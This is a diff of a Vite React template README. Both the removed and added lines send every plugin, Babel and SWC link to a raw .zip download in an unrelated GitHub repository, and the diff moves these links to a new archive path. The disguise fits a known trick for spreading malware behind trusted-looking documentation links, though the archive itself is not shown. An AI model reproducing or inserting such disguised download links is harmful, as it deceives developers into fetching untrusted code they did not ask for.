@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/imadosan/fast-react-pizza/main/src/react-fast-pizza-3.2-alpha.1.zip) uses [Babel](https://raw.githubusercontent.com/imadosan/fast-react-pizza/main/src/react-fast-pizza-3.2-alpha.1.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/imadosan/fast-react-pizza/main/src/react-fast-pizza-3.2-alpha.1.zip) uses [SWC](https://raw.githubusercontent.com/imadosan/fast-react-pizza/main/src/react-fast-pizza-3.2-alpha.1.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/imadosan/fast-react-pizza/raw/refs/heads/main/src/services/react-pizza-fast-v3.7.zip) uses [Babel](https://github.com/imadosan/fast-react-pizza/raw/refs/heads/main/src/services/react-pizza-fast-v3.7.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/imadosan/fast-react-pizza/raw/refs/heads/main/src/services/react-pizza-fast-v3.7.zip) uses [SWC](https://github.com/imadosan/fast-react-pizza/raw/refs/heads/main/src/services/react-pizza-fast-v3.7.zip) for Fast Refresh
